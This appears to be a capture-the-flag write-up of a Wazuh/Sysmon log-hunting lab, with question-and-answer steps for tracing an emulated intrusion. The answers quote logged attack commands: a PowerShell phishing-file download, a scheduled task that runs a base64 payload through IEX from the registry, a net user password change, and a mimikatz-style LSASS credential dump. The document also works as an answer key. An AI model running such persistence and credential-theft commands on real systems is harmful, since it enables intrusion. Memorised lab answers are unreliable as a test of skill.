## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Scenario
Swiftspend Finance, the coolest fintech company in town, is on a mission to level up its cyber security game to keep those digital adversaries at bay and ensure their customers stay safe and sound.

Led by the tech-savvy Senior Security Engineer John Sterling, Swiftspend's latest project is about beefing up their endpoint monitoring using Wazuh and Sysmon. They've been running some tests to see how well their cyber guardians can sniff out trouble. And guess what? You're the cyber sleuth they've called in to crack the code!

The tests were run on Apr 29, 2024, between 12:00:00 and 20:00:00. As you dive into the logs, you'll look for any suspicious process shenanigans or weird network connections, you name it! Your mission? Unravel the mysteries within the logs and dish out some epic insights to fine-tune Swiftspend's defences.

Machine Access
Click the Start Machine button attached to this task to start the VM. Give the machine about 5 minutes to fully set up the environment. Access the Wazuh Dashboard using your browser at https://10-10-129-18.p.thmlabs.com and use the credentials listed below:
```

## IP_Address
```IP_Address
10.10.129.18
```

## Credentials
| **Username** | admin          |
| ------------ | -------------- |
| **Password** | [password omitted] |
## Monday_Monitor 
Before starting and going deep into the monitoring lets first set some filter which will help us to identify about the process and logs is all about 
```Filters
agent.​id
agent.​name
data.​command
data.​win.​eventdata.​parentCommandLine
rule.​description
rule.​id
rule.​level
```
now lets head towards the first Question of the `Monday-Monitor`
```Questions
Q1. Initial access was established using a downloaded file. What is the file name saved on the host?
```
we then add the timeline on the logs to 29 April 12:00 - 29 April 20:00, also in the questions is asked about the download file which indicates the file was downloaded on our localhost so simply search for `localhost` on event and 3 output will pop where one was `malicious File Detected` and thats our answer 
```Answer
Command = \"powershell.exe\" &amp; {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\SwiftSpend_Financial_Expenses.xlsm}

A1. SwiftSpend_Financial_Expenses.xlsm
```
Lets head Towards the Second Question which is 
```Questions
Q2. What is the full command run to create a scheduled task?
```
here keyword is `scheduler` as it is the only way to schedule a command or process so search `scheduler` on event log 
and got 10 hits 
and after analyzing there is only 1 process which actually schedule all others are about `googleupdate.exe` Except this
```Answer
A2. \"cmd.exe\" /c \"reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f &amp; schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 12:34\"
```
Lets Move forward to Questions Third 
```Question
Q3. What time is the scheduled task meant to run?
```
From the Above Answer we Figure it out 
```Answer
A3. 12:34
```
Lets now Forward to next question
```Question
Q4. What was encoded?
```
Again From the Question 3 We figure it out on `cyberchef` for `base64string`
`cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0=` output = `ping www.youarevulnerable.thm`
So the 
```Answer
A4. ping www.youarevulnerable.thm
```
Next Question
```Question
Q5. What password was set for the new user account?
```
for this we search net1.exe as it is responsible for creating new user and we got 29 hits but only this comes to the favourable situation
```Answer
{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","providerGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","eventID":"1","version":"5","level":"4","task":"1","opcode":"0","keywords":"0x8000000000000000","systemTime":"2024-04-29T14:14:34.723431800Z","eventRecordID":"5786","processID":"6760","threadID":"2032","channel":"Microsoft-Windows-Sysmon/Operational","computer":"ATOMIC","severityValue":"INFORMATION","message":"\"Process Create:\r\nRuleName: -\r\nUtcTime: 2024-04-29 14:14:34.722\r\nProcessGuid: {c5d2b969-ab4a-662f-7a02-000000002201}\r\nProcessId: 856\r\nImage: C:\\Windows\\System32\\net1.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net1.exe\r\nCommandLine: C:\\Windows\\system32\\net1 user guest I_AM_M0NIT0R1NG\r\nCurrentDirectory: C:\\Users\\Administrator\\\r\nUser: ATOMIC\\Administrator\r\nLogonGuid: {c5d2b969-8a47-662f-8b54-0a0000000000}\r\nLogonId: 0xA548B\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\n


Actual Answer or password of the new user is 
A5. I_AM_M0NIT0R1NG
```
Now Lets Head Towards the new Question
```Question
Q6. What is the name of the .exe that was used to dump credentials?
```
For answer this question we need to search `mimikatz` as it is the post exploitation tool for dumping sensitive info and credentials 
and after that we got 4 hit and from which 1 was this 
```Answer
C:\\Tools\\AtomicRedTeam\\atomics\\T1003.001\\bin\\x64\\memotech.exe  \"sekurlsa::minidump C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit

A6. memotech.exe
```
last Question of the room which is 
```Question
Q7. Data was exfiltrated from the host. What was the flag that was part of the data?
```
For this simply just search Flag `THM` and found it 
```Answer
A7, [flag omitted]
```

# END

